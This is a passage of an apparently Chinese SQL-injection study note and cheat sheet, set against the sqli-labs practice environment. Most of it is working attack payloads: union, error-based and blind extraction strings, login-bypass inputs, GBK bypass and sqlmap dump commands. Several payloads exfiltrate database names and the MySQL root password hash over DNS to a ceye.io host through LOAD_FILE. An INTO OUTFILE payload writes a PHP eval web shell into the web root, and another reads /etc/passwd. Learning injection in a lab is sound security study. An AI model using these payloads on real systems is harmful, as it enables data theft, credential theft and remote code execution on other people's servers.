title=\"注入类型\"></a>注入类型</h4><ul>\n<li>SQL注入：攻击者把SQL命令插入到Web表单的输入域或页面请求的查询字符串，欺骗数据库服务器执行恶意的SQL命令命令注入：后端未过滤掉恶意数据，代码当做系统命令执行。</li>\n<li>代码注入：一般出现在不安全的使用某些函数<ul>\n<li>文件包含</li>\n<li>反序列化漏洞</li>\n</ul>\n</li>\n<li>LDAP注入<ul>\n<li>LDAP（轻量级目录访问协议），用于访问网络中的目录服务，常用在Active Directory，企业管理目录。<br>用户提交的输入不经验证插入LDAP搜索过滤器中，攻击者通过提交专门设计的输入修改过滤器的结构，以检索数据或执行未授权操作</li>\n</ul>\n</li>\n<li>XML注入<ul>\n<li>XXE漏洞：引用外部实体时，通过构造恶意内容，导致读取任意文件、<br>执行系统命令、探测内网端口、攻击内网网站等危害。</li>\n<li>XPath注入：与SQL注入类似，XPath解析器本身对URL、表单中提交的代码内容未作严格限制，导致恶意代码可以直接解析执行</li>\n<li>XQuery注入</li>\n</ul>\n</li>\n<li>JSON注入：轻量级的数据交换格式，主要利用特殊字符注入JSON中，造成解析失败</li>\n<li>JSONP注入：回调函数未作严格的检测和过滤</li>\n<li>判断一个HTTP请求是否存在SQL注入的方式：<ul>\n<li>经典：and1=1|and2&gt;1|or1=1 |or1&lt;1</li>\n<li>数据库函数：and sleep（4】=1 I and length（user（）】&gt;3</li>\n<li>特殊符号：单引号（’）双引号（”）</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"注入点\"><a href=\"#注入点\" class=\"headerlink\" title=\"注入点\"></a>注入点</h4><ul>\n<li>GET</li>\n<li>POST</li>\n<li>Cookie</li>\n<li>Host</li>\n<li>User-Agent</li>\n</ul>\n<h4 id=\"自动化注入工具\"><a href=\"#自动化注入工具\" class=\"headerlink\" title=\"自动化注入工具\"></a>自动化注入工具</h4><ul>\n<li>（1）SQL注入工具：<ul>\n<li>Sqlmap Havij Sqlid</li>\n</ul>\n</li>\n<li>（2）ASP，JSP注入工具：<ul>\n<li>NBSI阿D注入软件明小子注入软件</li>\n</ul>\n</li>\n<li>（3）PHP注入工具：<ul>\n<li>穿山甲注入软件海阳顶端注入软件</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"8-SQL手工注入步骤\"><a href=\"#8-SQL手工注入步骤\" class=\"headerlink\" title=\"8. SQL手工注入步骤\"></a>8. SQL手工注入步骤</h3><h4 id=\"注入点寻找\"><a href=\"#注入点寻找\" class=\"headerlink\" title=\"注入点寻找\"></a>注入点寻找</h4><ul>\n<li><p>判断请求方式</p>\n<ul>\n<li>浏览器F12  点网络</li>\n</ul>\n</li>\n<li><p>单引号闭合’  ‘</p>\n</li>\n<li><p>数字</p>\n</li>\n<li><p>单引号括号闭合（’ ‘）</p>\n</li>\n<li><p>双引号括号闭合（“ ”）</p>\n</li>\n<li><p>or 1=1</p>\n</li>\n<li><p>or 1=2</p>\n</li>\n<li><p>and 1=1</p>\n</li>\n<li><p>and 1=2</p>\n</li>\n<li><h4 id=\"数字型注入\"><a href=\"#数字型注入\" class=\"headerlink\" title=\"数字型注入\"></a>数字型注入</h4><ul>\n<li>加单引号  错误出异常</li>\n<li>and 1=1   正常</li>\n<li>and   1=2  异常</li>\n</ul>\n</li>\n<li><h4 id=\"字符型注入\"><a href=\"#字符型注入\" class=\"headerlink\" title=\"字符型注入\"></a>字符型注入</h4><ul>\n<li>加单引号  错误出异常</li>\n<li>and ‘1’ = ‘1  正常</li>\n<li>and ‘1’ = ‘2  异常</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"判断字段长度\"><a href=\"#判断字段长度\" class=\"headerlink\" title=\"判断字段长度\"></a>判断字段长度</h4><ul>\n<li>order  by  数字   可以判断字段的个数</li>\n<li>也可以用猜字段  union  select 1，2，3</li>\n</ul>\n<h4 id=\"判断字段回显位置\"><a href=\"#判断字段回显位置\" class=\"headerlink\" title=\"判断字段回显位置\"></a>判断字段回显位置</h4><p>在链接后面添加语句<code>【 union select 1,2,3,4,5,6,7,8,9,10,11#】</code>进行联合查询（联合查询时记得把前面的查询为空）来暴露可查询的字段号。 </p>\n<h4 id=\"判断数据库注入\"><a href=\"#判断数据库注入\" class=\"headerlink\" title=\"判断数据库注入\"></a>判断数据库注入</h4><p>利用内置函数暴数据库信息<br>version()版本；database()数据库；user()用户；<br>不用猜解可用字段暴数据库信息(有些网站不适用):<br>and 1=2 union all select version()<br>and 1=2 union all select database()<br>and 1=2 union all select user()<br>操作系统信息：and 1=2 union all select @@global.version_compile_os from mysql.user<br>数据库权限：<br>and ord(mid(user(),1,1))=114 返回正常说明为root </p>\n<h4 id=\"查找数据库名\"><a href=\"#查找数据库名\" class=\"headerlink\" title=\"查找数据库名\"></a>查找数据库名</h4><ul>\n<li><p>GET：IP/Less-1/?id=100’ union select 1,(select database()),3–+</p>\n</li>\n<li><p>POST：union select 1,(select group_concat(schema_name) from information_schema.schemata),3–+</p>\n</li>\n<li><p>查看数据库长度length（） and length(database())&gt;10–+</p>\n</li>\n<li><p>查看数据库名字mid（）或者left    </p>\n<ul>\n<li><p>mid (string，start，length）返回指定的字符串从指定位置开始（可以用来猜数据库名 ） and mid(database(),1,1)&gt;’a’</p>\n</li>\n<li><p>left (string,lenth)  返回最左边指定的字符数</p>\n<p>and left(database(),1)&gt;’a’  (猜名字)</p>\n</li>\n</ul>\n</li>\n<li><p>将查到的库名放到同一个字符串</p>\n<ul>\n<li>select GROUP_CONCAT(schema_name) from information_schema.schemata</li>\n</ul>\n</li>\n<li><p>查到数单个据库名发送到ceye</p>\n<ul>\n<li>union select 1,(select load_file(concat(‘\\\\‘,substr((select schema_name from information_schema.schemata  limit 1),1,41),’.mysql.ip.port.38ljf2.ceye.io\\abc’)))–+</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"查找数据表\"><a href=\"#查找数据表\" class=\"headerlink\" title=\"查找数据表\"></a>查找数据表</h4><ul>\n<li><p>union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’security’) ,3 </p>\n</li>\n<li><p>将单个表名发送到ceye</p>\n<p>uname=1’) union select 3,(select load_file(concat(‘\\\\‘,substr((select table_name from information_schema.tables where table_schema =’security’  limit 1),1,41),’.mysql.ip.port.38ljf2.ceye.io\\abc’)))–+</p>\n</li>\n</ul>\n<h4 id=\"查找数据表中所有字段（列）\"><a href=\"#查找数据表中所有字段（列）\" class=\"headerlink\" title=\"查找数据表中所有字段（列）\"></a>查找数据表中所有字段（列）</h4><ul>\n<li><h4 id=\"127-0-0-1-Less-3-id-100’-union-select-1-select-group-concat-column-name-from-information-schema-columns-where-table-name-’users’-and-table-schema-’security’-–\"><a href=\"#127-0-0-1-Less-3-id-100’-union-select-1-select-group-concat-column-name-from-information-schema-columns-where-table-name-’users’-and-table-schema-’security’-–\" class=\"headerlink\" title=\"127.0.0.1/Less-3/?id=100’) union select 1,(select group_concat(column_name) from information_schema.columns where table_name=’users’ and table_schema=’security’) –+\"></a>127.0.0.1/Less-3/?id=100’) union select 1,(select group_concat(column_name) from information_schema.columns where table_name=’users’ and table_schema=’security’) –+</h4></li>\n<li><p>获取内容</p>\n<ul>\n<li>union select 1,(select group_concat(username) from security.users limit 0,1),3 </li>\n</ul>\n</li>\n<li><p>查询某一个表的字段名发送到ceye</p>\n<ul>\n<li>union select 1,(select load_file(concat(‘\\\\‘,substr((select column_name from information_schema.columns where table_name=’users’ and table_schema=’security’ limit 1),1,41),’.mysql.ip.port.38ljf2.ceye.io\\abc’)))–+</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"猜解账号密码\"><a href=\"#猜解账号密码\" class=\"headerlink\" title=\"猜解账号密码\"></a>猜解账号密码</h4><ul>\n<li><p>outfile文件注入</p>\n<ul>\n<li>union select 1,’<?php @eval($_POST[360]);?>‘ into outfile ‘C:\\phpStudy\\PHPTutorial\\WWW\\Less-8\\3.php’–+</li>\n<li>into outfile ‘C:\\phpStudy\\PHPTutorial\\WWW\\Less-13\\1.txt’</li>\n</ul>\n</li>\n<li><p>查root密码ceye代码</p>\n<p>127.0.0.1/Less-1/?id=1’ union SELECT 1,(LOAD_FILE(CONCAT(‘\\\\‘,mid((SELECT password FROM mysql.user WHERE user=’root’ LIMIT 1),2,41),’.mysql.ip.port.38ljf2.ceye.io\\abc’))),3–+</p>\n</li>\n<li><p>bug   </p>\n<p>uname=1’) or 1=1 into outfile ‘C:\\phpStudy\\PHPTutorial\\WWW\\Less-13\\1.txt’;–+</p>\n<p>这个文件里会有所有的用户名和密码</p>\n</li>\n<li><p>查询数据</p>\n<p>union select 1,(select 1 from (select count(<em>),concat((select(select(select distinct concat(username,password) from users limit 0,1))from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) –+</p>\n</li>\n</ul>\n<h4 id=\"绕过登陆验证\"><a href=\"#绕过登陆验证\" class=\"headerlink\" title=\"绕过登陆验证\"></a>绕过登陆验证</h4><ul>\n<li>admin’ –</li>\n<li>admin’ #</li>\n<li>admin’/*</li>\n<li>‘ or 1=1–</li>\n<li>‘ or 1=1#</li>\n<li>‘ or 1=1/*</li>\n<li>‘) or ‘1’=’1–</li>\n<li>‘) or (‘1’=’1–</li>\n</ul>\n<h4 id=\"SQL注入常见函数\"><a href=\"#SQL注入常见函数\" class=\"headerlink\" title=\"SQL注入常见函数\"></a>SQL注入常见函数</h4><ul>\n<li><p>group_concat函数   可以把查询的内容组合成一个字符串</p>\n</li>\n<li><p>load_file(file name )  读取文件并将文件按字符串返回</p>\n</li>\n<li><p>left（string，length）返回最左边指定的字符数：<br>left（database（），1）&gt;’s’  (猜名字)</p>\n</li>\n<li><p>length（）判断长度<br>length（database（）&gt;5 </p>\n</li>\n<li><p>substr（a，b，c）从字符串a中截取 b到c长度</p>\n</li>\n<li><p>ascii（）将某个字符转为ascii值</p>\n<p>ascii（substr（user（），1，1））=101#</p>\n</li>\n<li><p>mid（（a，b，c）从字符串a中截取 b到c位置（可以用来猜数据库名 ）</p>\n</li>\n</ul>\n<h3 id=\"9-SQL注入备忘\"><a href=\"#9-SQL注入备忘\" class=\"headerlink\" title=\"9. SQL注入备忘\"></a>9. SQL注入备忘</h3><h4 id=\"SQL注入常用命令\"><a href=\"#SQL注入常用命令\" class=\"headerlink\" title=\"SQL注入常用命令\"></a>SQL注入常用命令</h4><ul>\n<li><p>查看当前用户：union select 1,(select user())–+</p>\n</li>\n<li><p>查看数据库版本：union select 1,(select version())–+</p>\n</li>\n<li><p>查看当前数据库名：union select 1,(select database())–+</p>\n</li>\n<li><p>查看操作系统union select 1,(select @@version_compile_os)–+</p>\n</li>\n<li><p>所有用户：</p>\n<ul>\n<li><p>union select 1,(select group_concat(user) from mysql.user)–</p>\n<p>+</p>\n</li>\n</ul>\n</li>\n<li><p>用户hash</p>\n<ul>\n<li>union select 1,(select group_concat(password) from mysql.user where user=’root’)</li>\n</ul>\n</li>\n<li><p>查看所有数据库名</p>\n<ul>\n<li>union select 1,(SELECT group_concat(schema_name) from information_schema.schemata)–+</li>\n</ul>\n</li>\n<li><p>查看某一个库的全部表</p>\n<ul>\n<li>union select 1,(SELECT group_concat(table_name) from information_schema.tables where table_schema=’库名’)–+</li>\n<li>union select 1,(SELECT group_concat(table_name) from information_schema.table_constraints where table_schema=’库名’</li>\n</ul>\n</li>\n<li><p>查看某个表的字段名</p>\n<ul>\n<li>union select 1,(SELECT group_concat(column_name) from information_schema.columns where table_name=’表名’)–+</li>\n</ul>\n</li>\n<li><p>查看某个库中某个表的字段名</p>\n<ul>\n<li>union select 1,(select group_concat(column_name) from information_schema.columns where table_name=’表名’ and table_schema=’库名’)–+</li>\n</ul>\n</li>\n<li><p>读文件</p>\n<ul>\n<li>union select 1,(SELECT load_file(‘/etc/passwd’))–+</li>\n</ul>\n</li>\n<li><p>写文件</p>\n<ul>\n<li>union select 1,’<?php @eval($_POST[360]);?>‘ into outfile ‘C:\\phpStudy\\PHPTutorial\\WWW\\Less-8\\3.php’–+</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"UNION注入\"><a href=\"#UNION注入\" class=\"headerlink\" title=\"UNION注入\"></a>UNION注入</h4><ul>\n<li>猜字段长度<ul>\n<li>order by 数字     uname=1’ order by 2</li>\n</ul>\n</li>\n<li>暴字段位置<ul>\n<li>union select 1,2      uname=1’ union select 1,2</li>\n</ul>\n</li>\n<li>在指定表中查询制指定用户的密码<ul>\n<li>union SELECT 1,password from 表 where username=’用户名’–+</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"报错注入\"><a href=\"#报错注入\" class=\"headerlink\" title=\"报错注入\"></a>报错注入</h4><ul>\n<li><p>floor   （SELECT user()可修改）</p>\n<ul>\n<li>OR (SELECT 8627 FROM(SELECT COUNT(<em>),CONCAT(0x70307e,(SELECT user()),0x7e7030,FLOOR(RAND(0)</em>2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)–+</li>\n</ul>\n</li>\n<li><h3 id=\"ExtractValue-有长度限制-最长32位-（select-version可修改）\"><a href=\"#ExtractValue-有长度限制-最长32位-（select-version可修改）\" class=\"headerlink\" title=\"ExtractValue(有长度限制,最长32位)   （select @@version可修改）\"></a>ExtractValue(有长度限制,最长32位)   （select @@version可修改）</h3><ul>\n<li>and extractvalue(1, concat(0x7e, (select @@version),0x7e))–+</li>\n</ul>\n</li>\n<li><h3 id=\"UpdateXml-有长度限制-最长32位-（SELECT-version可修改）\"><a href=\"#UpdateXml-有长度限制-最长32位-（SELECT-version可修改）\" class=\"headerlink\" title=\"UpdateXml(有长度限制,最长32位)  （SELECT @@version可修改）\"></a>UpdateXml(有长度限制,最长32位)  （SELECT @@version可修改）</h3><ul>\n<li>and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)–+</li>\n</ul>\n</li>\n<li><h3 id=\"NAME-CONST-适用于低版本，不太好用\"><a href=\"#NAME-CONST-适用于低版本，不太好用\" class=\"headerlink\" title=\"NAME_CONST(适用于低版本，不太好用)\"></a>NAME_CONST(适用于低版本，不太好用)</h3><ul>\n<li>and 1=(select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)–+</li>\n</ul>\n</li>\n<li><h3 id=\"Error-based-Double-Query-Injection\"><a href=\"#Error-based-Double-Query-Injection\" class=\"headerlink\" title=\"Error based Double Query Injection\"></a>Error based Double Query Injection</h3><ul>\n<li>or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) or 1–+</li>\n</ul>\n</li>\n<li><h3 id=\"exp-5-5-5以上-（select-user-可修改）\"><a href=\"#exp-5-5-5以上-（select-user-可修改）\" class=\"headerlink\" title=\"exp(5.5.5以上) （select user()可修改）\"></a>exp(5.5.5以上) （select user()可修改）</h3><ul>\n<li>and (select exp(~(select * from(select user())x)))–+</li>\n</ul>\n</li>\n<li><p>floor(Mysql):  and (select 1 from (select count(<em>),concat(user(),floor(rand(0)</em>2))x from information_schema.tables group by x)a);</p>\n</li>\n<li><p>Extractvalue(Mysql):  and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</p>\n</li>\n<li><p>Updatexml(Mysql):  and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</p>\n</li>\n<li><p>EXP: and exp(~(select * from(select user())a));</p>\n</li>\n<li><p>UTL INADDR. get host address(Oracle): and 1=utl inaddrget host address(select bannerO from sys.v_$version where rownum=1))</p>\n</li>\n<li><p>multipoint(Mysql)：and multipoint((select * from(select * from(select user())a)b));</p>\n</li>\n<li><p>polygon(Mysql)：and polygon((select * from(select * from(select user())a)b));</p>\n</li>\n<li><p>multipolygon(Mysql)：and multipolygon((select * from(select * from(select user())a)b));</p>\n</li>\n<li><p>linestring(Mysql)：and linestring((select * from(select * from(select user())a)b));</p>\n</li>\n<li><p>multilinestring(Mysql)：and multilinestring((select * from(select * from(select user())a)b));</p>\n</li>\n</ul>\n<h4 id=\"bool盲注\"><a href=\"#bool盲注\" class=\"headerlink\" title=\"bool盲注\"></a>bool盲注</h4><ul>\n<li><p>盲注的时候一定注意，MySQL4之后大小写不敏感，可使用binary()函数使大小写敏感。</p>\n</li>\n<li><h5 id=\"布尔条件构造\"><a href=\"#布尔条件构造\" class=\"headerlink\" title=\"布尔条件构造\"></a>布尔条件构造</h5><ul>\n<li><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//正常情况</span><br><span class=\"line\">'or bool<span class=\"comment\">#</span></span><br><span class=\"line\">true'and bool<span class=\"comment\">#</span></span><br><span class=\"line\">    </span><br><span class=\"line\">//不使用空格、注释</span><br><span class=\"line\">'or(bool)='1</span><br><span class=\"line\">true'and(bool)='1</span><br><span class=\"line\">    </span><br><span class=\"line\">//不使用or、and、注释</span><br><span class=\"line\">'^!(bool)='1</span><br><span class=\"line\">'=(bool)='</span><br><span class=\"line\">'||(bool)='1</span><br><span class=\"line\">true'%26%26(bool)='1</span><br><span class=\"line\">'=if((bool),1,0)='0</span><br><span class=\"line\">    </span><br><span class=\"line\">//不使用等号、空格、注释</span><br><span class=\"line\">'or(bool)&lt;&gt;'0</span><br><span class=\"line\">'or((bool)in(1))or'0</span><br><span class=\"line\">    </span><br><span class=\"line\">//其他</span><br><span class=\"line\">or (case when (bool) then 1 else 0 <span class=\"keyword\">end</span>)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>有时候where字句有括号又猜不到SQL语句的时候，可以有下列类似的fuzz</p>\n</li>\n<li><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1' or (bool) or '1'='1</span><br><span class=\"line\">1%' and (bool) or 1=1 and '1'='1</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n<li><h5 id=\"构造逻辑判断\"><a href=\"#构造逻辑判断\" class=\"headerlink\" title=\"构造逻辑判断\"></a>构造逻辑判断</h5><ul>\n<li><p>逻辑判断基本就那些函数：</p>\n</li>\n<li><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">left(user(),1)&gt;'r'  </span><br><span class=\"line\">right(user(),1)&gt;'r'  </span><br><span class=\"line\">substr(user(),1,1)='r'  </span><br><span class=\"line\">mid(user(),1,1)='r' </span><br><span class=\"line\">    </span><br><span class=\"line\">//不使用逗号 </span><br><span class=\"line\">user() regexp '^[a-z]'</span><br><span class=\"line\">user() like 'root%'</span><br><span class=\"line\">POSITION('root' in user())</span><br><span class=\"line\">mid(user() from 1 for 1)='r'</span><br><span class=\"line\">mid(user() from 1)='r'</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n<li><h5 id=\"利用order-by盲注\"><a href=\"#利用order-by盲注\" class=\"headerlink\" title=\"利用order by盲注\"></a>利用order by盲注</h5><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from admin where username='' or 1 union select 1,2,'5' order by 3;</span><br><span class=\"line\">+<span class=\"comment\">----+----------+---------------------------</span></span><br><span class=\"line\">| id | username | password                   </span><br><span class=\"line\">+<span class=\"comment\">----+----------+---------------------------</span></span><br><span class=\"line\">|  1 | 2        | 5                         </span><br><span class=\"line\">|  1 | admin    | 51b7a76d51e70b419f60d34 |</span><br><span class=\"line\">+<span class=\"comment\">----+----------+---------------------------</span></span><br><span class=\"line\">2 rows in <span class=\"keyword\">set</span> (<span class=\"number\">0.00</span> sec)</span><br><span class=\"line\">    </span><br><span class=\"line\">mysql&gt; <span class=\"keyword\">select</span> * <span class=\"keyword\">from</span> <span class=\"keyword\">admin</span> <span class=\"keyword\">where</span> username=<span class=\"string\">''</span> <span class=\"keyword\">or</span> <span class=\"number\">1</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"string\">'6'</span> <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> <span class=\"number\">3</span>;</span><br><span class=\"line\">+<span class=\"comment\">-----+--------+---------------------------</span></span><br><span class=\"line\">|id   |username| password                  </span><br><span class=\"line\">+<span class=\"comment\">----+--------+---------------------------</span></span><br><span class=\"line\">|  1  | admin- |51b7a76d51e70b419f60d3</span><br><span class=\"line\">|  1  |    2   | 6                            +<span class=\"comment\">------+----------+-------------------------</span></span><br><span class=\"line\">2 rows in <span class=\"keyword\">set</span> (<span class=\"number\">0.01</span> sec)</span><br></pre></td></tr></table></figure>\n\n</li>\n</ul>\n<h4 id=\"延时盲注\"><a href=\"#延时盲注\" class=\"headerlink\" title=\"延时盲注\"></a>延时盲注</h4><ul>\n<li>相对于bool盲注，就是把返回值0和1改为是否执行延时，<strong>能用其他方法就不使用延时</strong>。 </li>\n<li>一般格式<code>if((bool),sleep(3),0)</code>和<code>or (case when (bool) then sleep(3) else 0 end)</code></li>\n<li>两个函数： </li>\n<li>BENCHMARK(100000,MD5(1)) </li>\n<li>sleep(5)</li>\n<li>BENCHMARK()用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的cpu资源。推荐使用sleep()</li>\n</ul>\n<h4 id=\"Mysql注释符\"><a href=\"#Mysql注释符\" class=\"headerlink\" title=\"Mysql注释符\"></a>Mysql注释符</h4><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. <span class=\"comment\">-- -</span></span><br><span class=\"line\">2. <span class=\"comment\">/* .... */</span></span><br><span class=\"line\">3. <span class=\"comment\">#</span></span><br><span class=\"line\">4. `</span><br><span class=\"line\">5. ;%00</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"GBK绕过注入\"><a href=\"#GBK绕过注入\" class=\"headerlink\" title=\"GBK绕过注入\"></a>GBK绕过注入</h4><ul>\n<li>在分号前加%df%27</li>\n<li>示例：id=1%d%27 union select 1.2–+</li>\n</ul>\n<ol start=\"10\">\n<li>自动化注入工具</li>\n</ol>\n<h4 id=\"SQL注入工具\"><a href=\"#SQL注入工具\" class=\"headerlink\" title=\"SQL注入工具\"></a>SQL注入工具</h4><ul>\n<li>sqlmap使用<ul>\n<li>测试注入点  sqlmap  -u  “URL”</li>\n<li>爆数据库  sqlmap  -u  “URL”  –dbs</li>\n<li>查看当前库  sqlmap  -u  “URL”  –current -db</li>\n<li>显示数据表  sqlmap  -u  “URL”  -D 数据库 –tables</li>\n<li>显示字段      sqlmap  -u  “URL”  -D 数据库 -T 表  –columns</li>\n<li>脱库  sqlmap  -u  “URL”  -D 数据库 -T 表  -C “字段名1”,”字段名2”  –dump</li>\n<li>查看帮助   man  sqlmap</li>\n<li>查看注入点   sqlmap -r  1.txt </li>\n<li>爆数据库   sqlmap -r  1.txt  –dbs    （注意在注入点后面加*）</li>\n<li>查看当前库  sqlmap  -r  1.txt  –current -db</li>\n<li>显示数据表   sqlmap   -r  1.txt   -D 数据库 –tables</li>\n<li>显示字段      sqlmap  -r  1.txt  -D 数据库 -T 表  –columns</li>\n<li>查看某字段数据  sqlmap  -r  1.txt  -D 数据库 -T 表  -C  “字段名，字段名”  –dump</li>\n</ul>\n</li>\n<li>havij</li>\n<li>sqlid</li>\n</ul>\n<h4 id=\"ASP、JSP注入工具\"><a href=\"#ASP、JSP注入工具\" class=\"headerlink\" title=\"ASP、JSP注入工具\"></a>ASP、JSP注入工具</h4><ul>\n<li>NBSI</li>\n<li>阿D注入软件</li>\n<li>明小子</li>\n</ul>\n<h4 id=\"PHP注入工具\"><a href=\"#PHP注入工具\" class=\"headerlink\" title=\"PHP注入工具\"></a>PHP注入工具</h4><ul>\n<li>穿山甲注入软件</li>\n<li>海阳顶端注入软件</li>\n</ul>\n<h4 id=\"安全专家用的注入工具\"><a href=\"#安全专家用的注入工具\" class=\"headerlink\" title=\"安全专家用的注入工具\"></a>安全专家用的注入工具</h4><ul>\n<li>BSQL Hacker（注入框架）</li>\n<li>The Mole（可攻击Mysql、SQL server、Postgres和oracle）</li>\n<li>Pangolin （白帽专用啊哈哈哈哈）</li>\n<li>sqlamp  （非常强大）</li>\n<li>Havij （可攻击Mysql、oracle、Postgres、MS Access）</li>\n<li>safe3 SQL Injector（简单易用）</li>\n<li>SQL Poizon</li>\n</ul>\n<h3 id=\"10-笔记\"><a href=\"#10-笔记\" class=\"headerlink\" title=\"10. 笔记\"></a>10. 笔记</h3><ul>\n<li>爆SQL<br>select schema_name from information_schema.schemata<br>猜数据库<br>select schema_name from information_schema.schemata limit 0,1 （limit第几行）<br>test</li>\n<li>select table_name from information_schema.tables where table_schema=’xxxxx’<br>猜某库的数据表</li>\n<li>select column_name from information_schema.columns where table_name=’xxxxx’<br>猜某表的所有列</li>\n<li>select <strong>* from *</strong></li>\n<li></li>\n<li>mid(a,b,c)从位置 b 开始，截取 a 字符串的 c 位<br>ord 同ASCII<br>substr（user(),2,1）<br>substr（database(),2,1）从databases数据库名的第2位，截取长度为1<br>Order by 对前面的数据进行排序<br>information_schema 系统数据库名<br>tables 表名<br>information_schema.tables 查询这个数据库表<br>table_schema 这个字段<br>select table_name from information_schema.tables where table_schema = “security”;<br>select 列名称from表名 where列 运算符 值<br>@$sql=”SELECT username, password FROM users WHERE username=’admin’or’1’=’1# and<br>password=’$passwd’ LIMIT 0,1”;<br>数据库运行的SQL语句代码如上:<br>输入“ ‘后，注意 提示语法错误的 注明 ’ ” ）<br>‘) or ‘1’=(‘1’<br>) or 1=1 -<br>‘) or 1=1 order by 2  查看几列</li>\n<li>显示登录信息可以使用联合查询得到数据库名等信息<br>uname=1admin’union select 1,database()– -&amp;passwd=&amp;submit=Submit<br>联合查询  得到  database(数据库名)</li>\n<li>不显示登录信息使用 布尔型盲注<br>uname=admin’)and left(database(),1)&gt;’a’#&amp;passwd=1&amp;submit=Submit<br>database(),1表示第一位 &gt;大于a        大于的话就返回true<br>left(database(),1) =’s’    截取数据库名的前1位<br>left(database(),2) =’se’  截取数据库名的前2位<br>length(database())=8  查看数据库的长度<br>left(version()1)=5    查看数据库第1位为5<br>通过二分法 查到某位没有&gt;,= a（或者数字）<br>注释掉最后字符 – - –+ # %23 （每个试）</li>\n<li>substr(database(),,c)从 b 位置开始，截取字符串 a 的 c 长度。Ascii()将某个字符转换<br>为 ascii 值</li>\n<li>admin’and If(ascii(substr(database(),2,1))=115,1,sleep(5))#<br>时间注入 正确的话 直接登录，否则延迟5秒，得出 数据库名为 security<br>‘and If(ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1,1))=101,1,sleep(5))– -<br>猜测第一个数据表的第一位是 e…依次类推，得到 emai<br>limit 0,1 从0的位置开始 第1行 是emai  limit 1,1 从1的位置开始 第1行 是 ？？<br>猜测 users 表的列<br><a href=\"http://127.0.0.1/sqllib/Less-9/?id=1&#39;and\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1/sqllib/Less-9/?id=1&#39;and</a> If(ascii(substr((select column_name from information<br>_schema.columns where table_name=’users’ limit 0,1),1,1))=105,1,sleep(5))–+<br>猜测 username 的值<br><a href=\"http://127.0.0.1/sqllib/Less-9/?id=1&#39;and\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1/sqllib/Less-9/?id=1&#39;and</a> If(ascii(substr((select username from users limit 0,1), 1,1))=68,1,sleep(5))– -<br>猜第2位<br>‘and If(ascii(substr((select username from users limit 0,1), 2,1))=117,1,sleep(5))– -<br>是Dump<br>SELECT CONCAT(id, ‘，’, name) AS con FROM info LIMIT 1<br>concat 某几列<br>limit1    行1<br>以上为  查询第一行的  id 列 和name列，中间用,号隔开</li>\n<li>报 错 注 入<br>1’ union Select 1,count(<em>),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)</em>2))a from information_schema.columns group by a–+</li>\n<li>uname=admin”and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&amp;passwd=1&amp;sub<br>If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23</li>\n<li>select table_name from information_schema.tables where table_schema=’security’ limit 0,1<br>table_name<br>MYSQL 